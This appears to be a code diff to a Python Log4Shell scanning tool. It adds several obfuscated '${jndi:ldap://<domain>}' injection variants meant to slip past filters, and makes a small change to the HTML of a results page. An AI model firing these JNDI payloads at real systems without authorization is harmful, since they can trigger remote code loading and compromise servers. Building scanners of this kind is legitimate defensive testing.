@@ -12,13 +12,16 @@ payloads = [
     "${jndi:ldap://<domain>}",
     "${jndi:ldaps://<domain>}",
     "${jndi:dns://<domain>}",
-    "${jndi:rmi://<domain>}",
+    "${jndi:rmi://<domain>}",   
     "${jndi:${lower:l}dap://<domain>}",
     "${jndi:${upper:l}dap://<domain>}",
     "${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://<domain>}",
-    "${${env:NO_WAY_THIS_ENV_NAME_EXISTS:-j}ndi:ldap://<domain>}"
+    "${${env:NO_WAY_THIS_ENV_NAME_EXISTS:-j}ndi:ldap://<domain>}",
+    "${j${loWer:Nd}i${uPper::}${LowER:ld}ap${UPPER::}//<domain>}",
+    "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://<domain>}",
+    "${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://<domain>}",
+    "${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-l}dap${env:ENV_NAME:-:}//<domain>}"
 ]
-
 
 class MyHttpRequestHandler(http.server.SimpleHTTPRequestHandler):
     def do_GET(self):
@@ -79,7 +82,7 @@ class MyHttpRequestHandler(http.server.SimpleHTTPRequestHandler):
     </title>
   </head>
   <body>
-    <div class="container">
+    <div class="container" style="max-width: 1240px;">
 
     <h1>Unique string: {uri}</h1>
     <br/></br>
